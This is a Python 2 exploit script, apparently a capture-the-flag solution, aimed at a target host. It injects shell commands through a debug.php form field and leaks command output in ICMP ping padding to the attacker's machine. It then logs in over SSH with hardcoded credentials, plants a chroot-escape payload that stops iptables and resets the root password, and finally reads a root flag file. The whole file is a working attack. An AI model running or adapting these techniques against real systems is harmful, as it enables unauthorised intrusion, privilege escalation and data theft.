#!/usr/bin/env python

import urllib2, urllib,time,socket,struct,re,sys,os
from paramiko import *

def send_cmd(cmd):
    values = {'addr' : "; " + cmd}
    data = urllib.urlencode(values)
    req = urllib2.Request(URL,data)
    while True:
        try:
            success = True
            res = urllib2.urlopen(req,timeout=5)
            break
        except:
            success = False
            print "HTTP Host timeout, retrying.."
    p = res.read(1024)


def get_somebytes():
    data = sock.recv(1024)
    icmp = data[20:]
    str_len = len(icmp)-4
    pack_format = "!BBH"
    if str_len:
        pack_format += "%ss" % str_len
    unpacked_packet = struct.unpack(pack_format, icmp)
    type, code, checksum = unpacked_packet[:3]
    try:
        msg = unpacked_packet[3]
        ret = re.search('\xb0\x0b(.*?)\x0b\xb0',msg,re.DOTALL).groups()[0]
    except:
        ret = None
    return ret


'''
    To execute a command, we redirect output to a file, then we get the output size,
    we hex the file and we send it over icmp with the pattern option of the ping command.
    We must get the output size because we send the content in multiple chunks.
'''
def execute(cmd):
    outfile = '/tmp/out'
    cmd_str = 'a=$(<{0}); ping -c 1 -w 2 {1} -p b00b`echo {2} | xxd -pS`0bb0'
    send_cmd( '({0} 2>&1 ) | xxd -pS | tr -d "\n" > {1}'.format(cmd,outfile) )
    send_cmd(cmd_str.format(outfile,HOST,'${#a}'))
    out_size = get_somebytes()
    try:
        out_size = int(out_size)
    except:
        print "ERROR SIZE"
        return
    print "SIZE: {0}".format(out_size)
    res = ''
    CHUNK_SIZE = 8
    for i in xrange(0,out_size,CHUNK_SIZE):
        send_cmd(cmd_str.format(outfile,HOST,'${{a:{0}:{1}}}'.format(str(i),str(CHUNK_SIZE) )))
        res += get_somebytes()
    try:
        print "RESULT:\n{0}".format(''.join(res.split('\n')).decode('hex'))
    except TypeError:
        print "ERROR command: " + cmd


def main():
    execute('./sysadmin-tool --activate-service')
    c = SSHClient()
    c.set_missing_host_key_policy(AutoAddPolicy())
    c.connect(VICTIM, username='avida', password='dollars')
    # Lazy chroot environment setup sorry :D
    c.exec_command('mkdir -p /nginx/tmp/{sbin,usr}')
    c.exec_command('cp -Rf {/bin,/lib} /nginx/tmp')
    c.exec_command('cp -Rf /usr/lib /nginx/tmp/usr/')
    c.exec_command('cp /usr/bin/python /nginx/tmp/sbin/iptables-restore')
    send_cmd('mkdir -p /tmp/etc/sysconfig')
    chroot_break = r'''import os,sys,socket,subprocess,time
f = str(int(time.time()))
os.mkdir(f,0o755)
os.chroot(f)
os.chroot('../../../../../../../../../..')
print os.setuid(0)
os.system('/etc/init.d/iptables stop')
ROOTPWD = "w00t"
os.system('echo -e "{0}\n{0}" | passwd'.format(ROOTPWD))
print "ROOT PWD CHANGED ! :D"'''.encode('hex')
    execute('echo {0} | xxd -r -pS > /tmp/etc/sysconfig/iptables; echo NICE! chroot_break written with success!'.format(chroot_break))
    nested = '/tmp/'
    for i in range(1,101):
        nested += str(i) + '/'
    nested += 'breakout'
    send_cmd('mkdir -p ' + nested)
    print "LETS WAIT!!"
    time.sleep(5)
    execute('cd {0}/..;/usr/share/nginx/html/sysadmin-tool --activate-service'.format(nested))
    print "Connecting to root:w00t "
    c_root = SSHClient()
    c_root.set_missing_host_key_policy(AutoAddPolicy())
    c_root.connect(VICTIM, username='root', password='w00t')
    stdin,stdout,stderr = c_root.exec_command('cat /root/flag.txt')
    print '------------------  FLAG  -------------------'
    print ''.join(stdout.readlines())
    

if __name__ == "__main__":
    try:
        if os.geteuid() != 0:
            print "This script needs root privileges!"
            sys.exit(0)
        if len(sys.argv) != 3:
            print 'Usage: {0} [VICTIM] [THIS HOST]'.format(sys.argv[0])
            sys.exit(0)
        VICTIM = sys.argv[1]
        HOST = sys.argv[2]
        URL='http://' + VICTIM + '/debug.php'
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.bind(('', 33434))
        main()
        print "GOOD BYE!"
    except:
        print "AN ERROR HAS OCCURED! :("

